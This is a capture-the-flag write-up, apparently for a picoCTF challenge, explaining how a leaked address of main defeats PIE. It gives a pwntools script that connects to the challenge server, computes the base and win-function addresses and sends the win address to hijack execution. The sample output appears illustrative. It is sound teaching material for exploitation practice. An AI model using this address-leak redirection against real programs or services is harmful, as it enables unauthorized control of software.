
![[Pasted image 20250315203510.png]]
## **Step 1: Understanding PIE**

- PIE makes the binary load at a random base address.
- However, the program leaks the **address of `main`**, which allows us to calculate the base address.

---

## **Step 2: Extracting Addresses**

- The binary provides the address of `main` at runtime.
- Using this, we can calculate the **base address** by subtracting an offset.
- Once we have the base address, we can locate the **win function**.

---

## **Step 3: Constructing the Payload**

- Convert the win function address to a **hex string**.
- Send it as input to overwrite the execution flow.

---

## **Solution Script**

```
from pwn import *

binary = context.binary = ELF('./vuln', checksec=False)

# Connect to remote service
p = remote("rescued-float.picoctf.net", 51449)

# Receive and extract main's address
p.recvuntil(b"Address of main:")
main = int(p.recvline().strip(), 16)

log.info("Main: %#x", main)

# Calculate base address
base = main - 0x133d
log.info("Base: %#x", base)

# Calculate win function address
win = base + 0x12a7
log.info("Win: %#x", win)

# Send the calculated win address as input
p.sendline(f"{win:#x}".encode())

# Interactive shell
p.interactive()

```

## **Explanation of the Exploit**

1. **Leaking `main` Address:**
    
    - The program prints `main`'s address.
    - We parse and store it.
2. **Calculating Base Address:**
    
    - Since `main` is at `0x133d` offset, we subtract to get the base.
3. **Finding `win` Function Address:**
    
    - `win` is at `0x12a7` from the base.
    - Add base address to get the actual address.
4. **Sending the Address as Input:**
    
    - The program expects input that redirects execution.
    - We send the computed **win function address** in hexadecimal.

---

## **Expected Output**


`[*] Main: 0x565560133d 
[*] Base: 0x5655600000
[*] Win: 0x56556012a7
`
Then, the flag should be printed.

![[Pasted image 20250315204023.png]]
---

## **Final Thoughts**

- The challenge is a classic **PIE bypass** by leveraging a leaked address.
- No need for ROP or buffer overflow—just calculating and redirecting execution.